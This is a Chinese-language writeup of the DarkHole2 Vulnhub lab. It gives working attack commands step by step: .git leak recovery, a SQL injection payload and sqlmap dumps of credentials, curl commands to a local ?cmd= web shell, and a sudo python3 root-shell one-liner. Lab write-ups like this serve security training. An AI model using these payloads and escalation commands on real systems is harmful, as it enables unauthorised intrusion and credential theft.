---
title: "DarkHole2.0 Vulnhub靶场复现"
description: "大二开学第一个vulnhub靶场"
slug: "vulnhub-darkhole2-0"
pubDate: "2026-09-19"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# DarkHole2 Vulnhub靶场复现

## 靶场介绍

靶场地址 https://www.vulnhub.com/entry/darkhole-2,740/

介绍如下

Difficulty:Hard

This works better with VMware rather than VirtualBox

Hint: Don't waste your time For Brute-Force

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

靶机ip为10.10.10.138

### 端口扫描与漏洞探测

```shell
sudo nmap --min-rate 1000 -p- 10.10.10.137
```

只开放 22 ssh 端口和 80 http 服务端口，接下来仔细扫描一下

```shell
sudo nmap -p22,80 -sS -A 10.10.10.138
```

结果如下

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole V2
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   10.10.10.138:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure
```

| 端口 | 服务                       | 标题/版本                            | 备注                                                                          |
| ---- | -------------------------- | ------------------------------------ | ----------------------------------------------------------------------------- |
| 22   | SSH (OpenSSH 8.2p1)        | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3      | 登录入口，远程管理                                                            |
| 80   | HTTP (Apache httpd 2.4.41) | DarkHole V2 / Apache 2.4.41 (Ubuntu) | Web 入口；存在 `.git` 泄露；PHPSESSID 未设 HttpOnly；最后提交涉及 `login.php` |

再使用nmap的漏洞脚本扫描一下

```shell
sudo nmap --script=vuln -p22,80 10.10.10.138
```

扫描结果为：`/config/` 可列目录；PHPSESSID 缺 HttpOnly；可能存在 CSRF

### Web 服务探测

对80端口进行访问

有两个按钮分别是 View Datils ,点击没用，有一个 login 点击跳转 /login.php

看来目前方向80端口的web入口，优先级是看看 .git 泄露

### 目录爆破

```shell
sudo dirb http://10.10.10.138
```

| 路径/URL         | 类型          | 状态/发现                       | 为什么有用                               |
| ---------------- | ------------- | ------------------------------- | ---------------------------------------- |
| `/.git/HEAD`     | Git 源码泄露  | 200，SIZE 23；确认 Git 仓库存在 | 可恢复源码、提交历史、配置、硬编码凭据   |
| `/config/`       | 敏感目录      | 目录可列                        | 可能泄露数据库密码、密钥、应用配置       |
| `/js/`           | JS 目录       | 目录可列                        | 可能泄露接口、密钥、隐藏路径、前端逻辑   |
| `/login.php`     | 登录入口      | nmap 发现；本次目录扫描未列出   | 认证突破口，可能有弱口令、SQL 注入、CSRF |
| `/server-status` | Apache 状态页 | 403                             | 可能泄露请求信息，但当前被拒绝访问       |

## 漏洞发现及其利用

### 使用 GitHack 对泄露的 .git 目录进行下载

针对 .git 泄露，此前在 CTF 中遇到过类似题型。可以使用 GitHack 或 git-dumper 这两个开源工具，它们能下载并解析 .git 数据，恢复成正常的项目源码目录。

- 工具链接：[lijiejie/GitHack](https://github.com/lijiejie/GitHack)
- 工具链接：[arthaud/git-dumper](https://github.com/arthaud/git-dumper)

这里分别演示 git clone 和 GitHack 的结果。最后发现，我演示的是歪路。后面有对这个问题的补充

使用 wget 的命令如下：

```shell
wget -r -np -nH http://10.10.10.138/.git/
```

当然，可以尝试一下 git clone，不过这里不行：

```powershell
PS D:\Ke1th_Labs\Vulnhub\Darkhole_2\git give away> git clone http://10.10.10.138/.git/
Cloning into '10.10.10.138'...
fatal: repository 'http://10.10.10.138/.git/' not found
```

原因分析：git clone 需要服务器支持 Smart HTTP 协议，而靶机这里只是单纯的静态文件泄露（Dumb HTTP），因此无法直接 clone。

转而使用 GitHack：

```powershell
PS E:\Tools\GitHack> python GitHack.py http://10.10.10.138/.git/
[+] Download and parse index file ...
[+] .idea/.gitignore
[+] .idea/darkhole_2.iml
[+] .idea/modules.xml
[+] config/config.php
[+] dashboard.php
[+] index.php
[+] js/index.js
[+] login.php
[+] logout.php
[+] style/dashboard.css
[+] style/home.jpg
[+] style/index.css
[+] style/login.css
[+] style/login.jpg
[Error] [WinError 183] 当文件已存在时，无法创建该文件。: '10.10.10.138\\.idea'
[OK] .idea/modules.xml
[OK] .idea/.gitignore
[OK] config/config.php
[OK] dashboard.php
[OK] index.php
[OK] js/index.js
[OK] .idea/darkhole_2.iml
[OK] logout.php
[OK] login.php
[OK] style/dashboard.css
[OK] style/index.css
[OK] style/login.css
[OK] style/home.jpg
[OK] style/login.jpg
```

这个报错不影响

然后就可以在 IDE 中进行审计了。不过这里有个问题可以解答一下：

### 为什么能直接访问 .git目录，还需要使用 GitHack 等工具下载？

因为能够访问 .git 目录不等于已经获得完整、可读的源码。

.git 目录中保存的是 Git 的内部对象和元数据，直接通过浏览器访问只能看到这些原始文件。使用 GitHack 可以自动下载并解析 `.git` 中的数据，恢复成正常的项目源码目录，方便后续源码审计和查看 Git 历史。

此时可以将恢复后的源码导入 VS Code，并结合 AI Agent 辅助进行源码审计（例如重点关注 `config/config.php` 和 `login.php`，梳理登录逻辑、寻找敏感信息和潜在漏洞）；但最终仍需要人工验证 AI 发现的问题，不可全信。

### 为什么后面又转头选择了 wget 下载目录

当我回头访问 http://10.10.10.138/.git/ 这里的时候，发现目录里面的COMMIT_EDITMSG 储存的一句话提示 `i changed login.php file for more secure` （nmap的漏洞脚本也扫出来过）表明了我需要.git文件使用 git diff 看看 login.php 找到之前改动的可能泄露的信息或者提示

### 那为什么 githack 和 可访问的.git 目录不一样呢，以及为什么没有.git文件夹？

简单来说就是 GitHack 干的是“提取源码”的活，不是“克隆仓库”的活。而且 GitHack 获取的是最新的源码，不能很好的利用到这个提示

### wget 获取.git目录

```shell
mkdir -p git-give-away
cd git-give-away
wget -r -np -nH http://10.10.10.138/.git/
```

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ ls -liah
总计 12K
3967506 drwxrwxr-x 3 kali kali 4.0K  9月18日 13:00 .
3967505 drwxrwxr-x 3 kali kali 4.0K  9月18日 13:00 ..
3967507 drwxrwxr-x 7 kali kali 4.0K  9月18日 13:00 .git
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ git status
位于分支 master
尚未暂存以备提交的变更：
  （使用 "git add/rm <文件>..." 更新要提交的内容）
  （使用 "git restore <文件>..." 丢弃工作区的改动）
        删除：     .idea/.gitignore
        删除：     .idea/darkhole_2.iml
        删除：     .idea/modules.xml
        删除：     config/config.php
        删除：     dashboard.php
        删除：     index.php
        删除：     js/index.js
        删除：     login.php
        删除：     logout.php
        删除：     style/dashboard.css
        删除：     style/home.jpg
        删除：     style/index.css
        删除：     style/login.css
        删除：     style/login.jpg
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ git log --oneline
0f1d821 (HEAD -> master) i changed login.php file for more secure
a4d900a I added login.php file with default credentials
aa2a5f3 First Initialize
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ git checkout .
从索引区更新了 14 个路径
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ ls -liah
总计 48K
3967506 drwxrwxr-x 7 kali kali 4.0K  9月18日 13:08 .
3967505 drwxrwxr-x 3 kali kali 4.0K  9月18日 13:00 ..
3967930 drwxrwxr-x 2 kali kali 4.0K  9月18日 13:08 config
3967932 -rw-rw-r-- 1 kali kali 5.5K  9月18日 13:08 dashboard.php
3967507 drwxrwxr-x 7 kali kali 4.0K  9月18日 13:08 .git
3967926 drwxrwxr-x 2 kali kali 4.0K  9月18日 13:08 .idea
3967933 -rw-rw-r-- 1 kali kali 1.1K  9月18日 13:08 index.php
3967934 drwxrwxr-x 2 kali kali 4.0K  9月18日 13:08 js
3967936 -rw-rw-r-- 1 kali kali 1.5K  9月18日 13:08 login.php
3967937 -rw-rw-r-- 1 kali kali  179  9月18日 13:08 logout.php
3967938 drwxrwxr-x 2 kali kali 4.0K  9月18日 13:08 style
```

接下来查看旧版 login.php 的完整内容

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2/git-give-away]
└─$ git diff HEAD~1 HEAD -- login.php
diff --git a/login.php b/login.php
index 8a0ff67..0904b19 100644
--- a/login.php
+++ b/login.php
@@ -2,7 +2,10 @@
 session_start();
 require 'config/config.php';
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
+    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
+    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
+    if($check->num_rows){
         $_SESSION['userid'] = 1;
         header("location:dashboard.php");
         die();
```

原先的代码直接把账号密码写死在代码里： lush@admin.com 321。

后面改成了从数据库查询，并且加了 mysqli_real_escape_string`和`htmlspecialchars 过滤

但问题在于：旧版的硬编码凭据极有可能在数据库里依然有效，或者管理员根本没有改密码！这就是 .git 泄露最致命的地方——历史提交里藏着过去的秘密

### 为什么 wget 下载后只有 .git 文件夹，没有源码文件？

不是 wget 没下完整，而是它下载的东西本来就只有 .git 目录。源码文件根本不在那个 URL 下面。

.git 和源码是两回事

服务器上 Web 根目录里实际存在两类东西：

| 类型           | 路径示例                                             | 说明                   |
| -------------- | ---------------------------------------------------- | ---------------------- |
| 工作区源码文件 | `/login.php`、`/dashboard.php`、`/config/config.php` | 普通文件，可直接访问   |
| Git 仓库数据   | `/.git/` 里的 `HEAD`、`objects/`、`refs/`、`logs/`   | Git 内部数据，不是源码 |

`wget -r http://10.10.10.138/.git/` 只爬 .git/ 这一个目录，所以它只会下载 `.git/` 里的东西，不会去下 `/login.php`。不是下不全，而是你让它下的范围就只有 .git/

### 回到80端口，拿着获取的账号密码去登陆

登陆后跳转到http://10.10.10.138/dashboard.php?id=1

值得注意的两个信息

1. 这个账户归属人的信息
2. 注意这个url有个id=1，可以联想到sql注入或者idor。只是猜测，通过下载的源码可以进行分析，是否存在漏洞

### 审计源码寻找漏洞

#### SQL 注入点：`dashboard.php` 的 `mobile` 参数

`dashboard.php` 被 `goto` 和十六进制编码混淆过，但核心逻辑可以还原出来。关键代码在文件开头的 POST 处理块中：

```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fname   = mysqli_real_escape_string($connect, $_POST["fname"]);
    $email   = mysqli_real_escape_string($connect, $_POST["email"]);
    $address = mysqli_real_escape_string($connect, $_POST["address"]);
    $mobile  = $_POST["mobile"];   // 未经过滤！

    $connect->query("UPDATE users SET
        username='{$fname}',
        email='{$email}',
        address='{$address}',
        contact_number='{$mobile}'
        WHERE id=1");
}
```

**问题点**：

- `fname`、`email`、`address` 都用了 `mysqli_real_escape_string` 转义；
- 但 `mobile` 直接取 `$_POST["mobile"]`，**没有做任何过滤或转义**；
- 它被直接拼接进 `UPDATE` 语句的 `contact_number='{$mobile}'` 中，单引号可以被闭合，造成 UPDATE 型 SQL 注入。

**注入验证思路**：

向 `dashboard.php` 发送 POST 请求，在 `mobile` 参数中构造 payload，例如：

```sql
mobile=1' and extractvalue(1,concat(0x7e,database()))-- -
```

如果页面报出 `XPATH syntax error: '~darkhole_2'`，说明注入成功。

**注意**：URL 中的 `?id=1` 并不是注入点，源码里没有使用 `$_GET['id']`，它只是一个摆设。真正的注入点在 POST 的 `mobile` 参数。

### 利用 Burp 和 sqlmap 进行 SQL 注入

首先在 `dashboard.php` 页面点击 SUBMIT 进行抓包，记录下请求中的 `PHPSESSID`：

```text
Cookie: PHPSESSID=jlmkbnn53b8qrtobthge8onaun
```

打开 sqlmap，对 `id` 参数进行检测：

```powershell
E:\Tools\天狐渗透工具箱-社区版V4.0\tools\gui_scan\sqlmap>python sqlmap.py -u "http://10.10.10.138/dashboard.php?id=1" --dbs --batch --cookie PHPSESSID=jlmkbnn53b8qrtobthge8onaun
```

这里发现源码版本未发现 id 注入，但实际运行环境存在差异，最终实测发现 id 可注入

关键输出：

```text
GET parameter 'id' is vulnerable.
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1' AND (SELECT 4982 FROM (SELECT(SLEEP(5)))VGFj) AND 'ZlaS'='ZlaS

Type: UNION query
Title: Generic UNION query (NULL) - 6 columns
Payload: id=-6241' UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,...),NULL,NULL,NULL-- -
```

数据库列表：

```text
available databases [5]:
[*] darkhole_2
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

sqlmap 判断该注入点存在 UNION 注入，并确定查询结果包含 6 列，因此后续可以利用 UNION 查询获取数据库中的其他数据，直接枚举 `darkhole_2` 库中的表：

```powershell
python sqlmap.py -u "http://10.10.10.138/dashboard.php?id=1" --cookie="PHPSESSID=jlmkbnn53b8qrtobthge8onaun" -D darkhole_2 --tables --batch
```

发现两张表：`ssh` 和 `users`。

分别 dump：

```powershell
python sqlmap.py -u "http://10.10.10.138/dashboard.php?id=1" --cookie="PHPSESSID=jlmkbnn53b8qrtobthge8onaun" -D darkhole_2 -T ssh --dump --batch --technique=U --union-cols=6
```

`ssh` 表内容：

| id  | pass | user  |
| --- | ---- | ----- |
| 1   | fool | jehad |

```powershell
python sqlmap.py -u "http://10.10.10.138/dashboard.php?id=1" --cookie="PHPSESSID=jlmkbnn53b8qrtobthge8onaun" -D darkhole_2 -T users --dump --batch --technique=U --union-cols=6
```

`users` 表内容：

| id  | email          | address                                  | password | username                    | contact_number |
| --- | -------------- | ---------------------------------------- | -------- | --------------------------- | -------------- |
| 1   | lush@admin.com | Street, Pincode, Province/State, Country | 321      | Jehad Alqurashiasddasdasdas | 1              |

至此，获得 SSH 凭据：`jehad / fool`，以及后台账号：`lush@admin.com / 321`。

## SSH 登陆 jehad账户

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/DakeHole2]
└─$ ssh jehad@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ED25519 key fingerprint is: SHA256:JmrTZ4RY4EPBC4GpHk9i3+c29L5n1QtcfSgbqG8D2+8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jehad@10.10.10.138's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 18 Sep 2026 06:07:30 PM UTC

  System load:  0.03               Processes:              230
  Usage of /:   48.6% of 12.73GB   Users logged in:        0
  Memory usage: 20%                IPv4 address for ens33: 10.10.10.138
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  3 05:49:05 2021 from 192.168.135.128
jehad@darkhole:~$
```

### 在jehad用户权限上信息信息收集

```shell
jehad@darkhole:~$ whoami
jehad
jehad@darkhole:~$ pwd
/home/jehad
jehad@darkhole:~$ uname -a
Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
jehad@darkhole:~$ id
uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
jehad@darkhole:~$ ls -liah
total 36K
688411 drwxr-xr-x 5 jehad jehad 4.0K Sep  3  2021 .
655361 drwxr-xr-x 5 root  root  4.0K Sep  2  2021 ..
684142 -rw------- 1 jehad jehad 3.1K Sep  3  2021 .bash_history
684131 -rw-r--r-- 1 jehad jehad  220 Sep  2  2021 .bash_logout
684132 -rw-r--r-- 1 jehad jehad 3.7K Sep  2  2021 .bashrc
688412 drwx------ 2 jehad jehad 4.0K Sep  2  2021 .cache
688416 drwxrwxr-x 3 jehad jehad 4.0K Sep  2  2021 .local
684133 -rw-r--r-- 1 jehad jehad  807 Sep  2  2021 .profile
688420 drwx------ 2 jehad jehad 4.0K Sep  3  2021 .ssh
```

### 尝试sudo和suid提权无果

可以尝试提一下权

在我自己的Linux提权流程中：

1. 系统信息（`uname`、`id`）
2. SUID / sudo（`find`、`sudo`）
3. 计划任务（`cron`）
4. 网络与端口（`netstat`、`ss`）
5. 进程与服务（`ps aux`）
6. 敏感文件（`.bash_history`、配置文件）

```shell
jehad@darkhole:~$ sudo -l
[sudo] password for jehad:
Sorry, user jehad may not run sudo on darkhole.
jehad@darkhole:~$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
```

sudo 明确不行，suid 都是系统文件

### 计划任务提权尝试

```shell
jehad@darkhole:~$ crontab -l
no crontab for jehad
```

计划任务也没有任何信息

### 本地服务枚举

计划任务没有收获，接下来看本机监听了哪些端口。外部 nmap 只能扫到 22 和 80，但登录后可以看到只监听 `127.0.0.1` 的内部服务。

```shell
jehad@darkhole:~$ ss -tulpn
Netid               State                 Recv-Q                Send-Q                                    Local Address:Port                                Peer Address:Port               Process
udp                 UNCONN                0                     0                                    10.10.10.138%ens33:68                                       0.0.0.0:*
udp                 UNCONN                0                     0                                         127.0.0.53%lo:53                                       0.0.0.0:*
tcp                 LISTEN                0                     70                                            127.0.0.1:33060                                    0.0.0.0:*
tcp                 LISTEN                0                     151                                           127.0.0.1:3306                                     0.0.0.0:*
tcp                 LISTEN                0                     4096                                          127.0.0.1:9999                                     0.0.0.0:*
tcp                 LISTEN                0                     4096                                      127.0.0.53%lo:53                                       0.0.0.0:*
tcp                 LISTEN                0                     128                                             0.0.0.0:22                                       0.0.0.0:*
tcp                 LISTEN                0                     511                                                   *:80                                             *:*
tcp                 LISTEN                0                     128                                                [::]:22                                          [::]:*
jehad@darkhole:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 10.10.10.138:68         0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

两条命令均验证了9999端口正在被监听

### 查看9999端口进程

```shell
jehad@darkhole:~$ ps aux | grep -i 9999
losy        1903  0.0  0.0   2608   612 ?        Ss   14:30   0:00 /bin/sh -c  cd /opt/web && php -S localhost:9999
losy        1906  0.0  0.4 193672 18832 ?        S    14:30   0:00 php -S localhost:9999
jehad      12551  0.0  0.0   6300   668 pts/0    S+   18:27   0:00 grep --color=auto -i 9999
```

可以发现 losy 用户在跑 php -S localhost:9999，工作目录是 /opt/web

继续看看服务对外提供什么

```shell
jehad@darkhole:~$ curl -i http://127.0.0.1:9999
HTTP/1.1 200 OK
Host: 127.0.0.1:9999
Date: Fri, 18 Sep 2026 18:30:24 GMT
Connection: close
X-Powered-By: PHP/7.4.3
Content-type: text/html; charset=UTF-8
Parameter GET['cmd']
```

服务是活的，PHP 7.4.3，Parameter GET['cmd']，意思是它接收 ?cmd= 参数，并且大概率会把参数值当命令执行。这就是典型的命令执行马

### 验证命令执行

```shell
jehad@darkhole:~$ curl "http://127.0.0.1:9999/?cmd=id"
Parameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)
uid=1002(losy) gid=1002(losy) groups=1002(losy)
```

命令执行确认成功，现在是以 losy 身份执行命令。接下来按顺序拿凭据、切用户、提权

### 读 losy 的 .bash_history

`.bash_history` 本身并不是漏洞，而是敏感操作痕迹泄露。其危险性取决于文件权限以及当前用户是否能够读取目标用户的历史记录

```shell
curl "http://127.0.0.1:9999/?cmd=cat%20/home/losy/.bash_history"
```

这里我提取重要的出来

```shell
P0assw0rd losy:gang
php -S localhost:9999
sudo -l
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
mysql -e '\! /bin/bash'
mysql -u root -p -e '\! /bin/bash'
su lama
ssh-keygen -t rsa -b 4096
chmod 777 .ssh/
chmod 666 id_rsa
```

得知

1. **密码泄露**：P0assw0rd losy:gang losy用户的密码是 gang。
2. **提权命令**：sudo python3 -c 'import os; os.system("/bin/sh")' 或 sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")' 表明 `losy` 可以免密执行 /usr/bin/python3，直接用来提权到 root。

## 先切换到losy账户,获取user flag

```shell
jehad@darkhole:~$ su losy
Password:
losy@darkhole:/home/jehad$
losy@darkhole:/home/jehad$ cd /home/losy
losy@darkhole:~$ ls -liah
total 36K
688413 drwxr-xr-x 4 losy losy 4.0K Sep  3  2021 .
655361 drwxr-xr-x 5 root root 4.0K Sep  2  2021 ..
684141 -rw------- 1 losy losy 1.1K Sep  3  2021 .bash_history
684135 -rw-r--r-- 1 losy losy  220 Sep  2  2021 .bash_logout
684136 -rw-r--r-- 1 losy losy 3.7K Sep  2  2021 .bashrc
688414 drwx------ 2 losy losy 4.0K Sep  2  2021 .cache
688423 drwxrwxr-x 3 losy losy 4.0K Sep  3  2021 .local
684137 -rw-r--r-- 1 losy losy  807 Sep  2  2021 .profile
684144 -rw-rw-r-- 1 losy losy   55 Sep  3  2021 user.txt
losy@darkhole:~$ cat user.txt
DarkHole{'This_is_the_life_man_better_than_a_cruise'}
```

## 提权至root,获取rootflag

```shell
losy@darkhole:~$ sudo python3 -c 'import os; os.system("/bin/sh")'
# whoami
root
# pwd
/home/losy
# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
# cd /root
# ls
root.txt  snap
# cat root.txt
DarkHole{'Legend'}
```
